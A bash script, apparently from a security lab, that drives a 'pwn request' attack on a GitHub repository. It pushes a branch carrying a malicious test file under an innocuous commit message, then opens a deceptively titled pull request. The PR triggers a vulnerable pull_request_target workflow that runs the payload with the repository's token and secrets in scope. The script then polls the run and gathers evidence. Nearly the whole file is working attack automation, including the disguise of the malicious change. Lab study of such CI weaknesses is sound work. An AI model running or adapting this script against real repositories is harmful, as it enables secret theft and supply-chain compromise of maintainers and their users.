#!/usr/bin/env bash
# Scenario 01 — pwn request attack driver.
#
# Opens a PR against turla-lab-targets/pwn-request-target whose only
# change is a malicious test file. The target's vulnerable
# pull_request_target workflow (.github/workflows/ci.yml there) checks
# out this PR's head commit and runs `npm test`, which runs the
# malicious test with the workflow's GITHUB_TOKEN and secrets in scope.
#
# Uses `gh api` (REST) throughout rather than `gh pr` / `gh run`, which
# depend on GitHub's GraphQL API.
#
# Requires: gh CLI with push access to the target repo, and a local
# clone of it at $TARGET_CLONE.
#
# Usage: ./attack.sh
# Produces files under evidence/: pr.json, run-metadata.json,
# pr-comments.json, evidence.json (from the run's uploaded artifact).

set -euo pipefail

TARGET_REPO="turla-lab-targets/pwn-request-target"
TARGET_CLONE="${TARGET_CLONE:-/home/claude/pwn-request-target}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EVIDENCE_DIR="$SCRIPT_DIR/evidence"
BRANCH="attack/pwn-request-01-$(date +%s)"

mkdir -p "$EVIDENCE_DIR"

echo "==> Target clone: $TARGET_CLONE"
cd "$TARGET_CLONE"
git fetch origin main
git checkout -B "$BRANCH" origin/main

echo "==> Staging malicious payload as tests/evil.test.js"
cp "$SCRIPT_DIR/payload/evil.test.js" tests/evil.test.js

git add tests/evil.test.js
git -c user.name="TurlaFSB" -c user.email="ltprince0112@gmail.com" \
  commit -m "Add a new test case for edge values

(This commit message is deliberately mundane — in a real attack, a
malicious PR does not announce itself. The actual change is the test
file's content.)"
git push origin "$BRANCH"

echo "==> Opening PR via REST API"
PR_JSON=$(gh api "repos/$TARGET_REPO/pulls" \
  -f title="Add edge-case test coverage" \
  -f body="Adds a couple more test cases around boundary values for add()." \
  -f head="$BRANCH" \
  -f base="main")
echo "$PR_JSON" > "$EVIDENCE_DIR/pr.json"
PR_NUMBER=$(echo "$PR_JSON" | python3 -c 'import json,sys; print(json.load(sys.stdin)["number"])')
echo "PR #$PR_NUMBER: https://github.com/$TARGET_REPO/pull/$PR_NUMBER"

echo "==> Waiting for pull_request_target run to appear"
# NOTE: the "branch" filter on this endpoint matches the run's
# head_branch (the PR's branch), not the PR's base branch — so we
# filter on $BRANCH, not "main".
RUN_ID=""
for i in $(seq 1 12); do
  sleep 10
  RUN_ID=$(gh api "repos/$TARGET_REPO/actions/runs?event=pull_request_target&branch=$BRANCH" \
    --jq '.workflow_runs[0].id' 2>/dev/null || true)
  if [ -n "$RUN_ID" ] && [ "$RUN_ID" != "null" ]; then
    break
  fi
done

if [ -z "$RUN_ID" ] || [ "$RUN_ID" = "null" ]; then
  echo "Could not find the triggered run. Check manually: https://github.com/$TARGET_REPO/actions"
  exit 1
fi

echo "==> Run: https://github.com/$TARGET_REPO/actions/runs/$RUN_ID"
echo "==> Polling until it finishes"
STATUS=""
for i in $(seq 1 30); do
  STATUS=$(gh api "repos/$TARGET_REPO/actions/runs/$RUN_ID" --jq '.status')
  CONCLUSION=$(gh api "repos/$TARGET_REPO/actions/runs/$RUN_ID" --jq '.conclusion')
  echo "    status=$STATUS conclusion=$CONCLUSION"
  if [ "$STATUS" = "completed" ]; then
    break
  fi
  sleep 10
done

echo "==> Collecting evidence"
gh api "repos/$TARGET_REPO/actions/runs/$RUN_ID" > "$EVIDENCE_DIR/run-metadata.json"
gh api "repos/$TARGET_REPO/issues/$PR_NUMBER/comments" > "$EVIDENCE_DIR/pr-comments.json"

ARTIFACT_ID=$(gh api "repos/$TARGET_REPO/actions/runs/$RUN_ID/artifacts" \
  --jq ".artifacts[] | select(.name==\"evidence-$RUN_ID\") | .id" || true)
if [ -n "$ARTIFACT_ID" ]; then
  # The artifact download redirects to Azure Blob Storage, which some
  # sandboxed environments block at the network/proxy level. If this
  # fails, the run-metadata.json + pr-comments.json already collected
  # above are sufficient evidence on their own: job conclusion "success"
  # means the payload's assertions (PR comment posted, secret hashed)
  # passed. Download evidence.zip manually from the Actions run page
  # as a fallback.
  if gh api "repos/$TARGET_REPO/actions/artifacts/$ARTIFACT_ID/zip" > "$EVIDENCE_DIR/evidence.zip" 2>"$EVIDENCE_DIR/.artifact-download.err"; then
    unzip -o "$EVIDENCE_DIR/evidence.zip" -d "$EVIDENCE_DIR" > /dev/null
    echo "==> evidence.json extracted to $EVIDENCE_DIR/evidence.json"
  else
    echo "==> Artifact download blocked (likely network policy in this environment)."
    echo "    run-metadata.json + pr-comments.json still prove the attack; download"
    echo "    evidence.zip manually from: https://github.com/$TARGET_REPO/actions/runs/$RUN_ID"
    rm -f "$EVIDENCE_DIR/evidence.zip"
  fi
else
  echo "No evidence artifact found — check run-metadata.json / the Actions log."
fi

echo "$PR_NUMBER" > "$EVIDENCE_DIR/pr-number.txt"
echo "$RUN_ID" > "$EVIDENCE_DIR/run-id.txt"
echo "$BRANCH" > "$EVIDENCE_DIR/branch.txt"

echo "==> Done. Review $EVIDENCE_DIR before writing up the scenario."
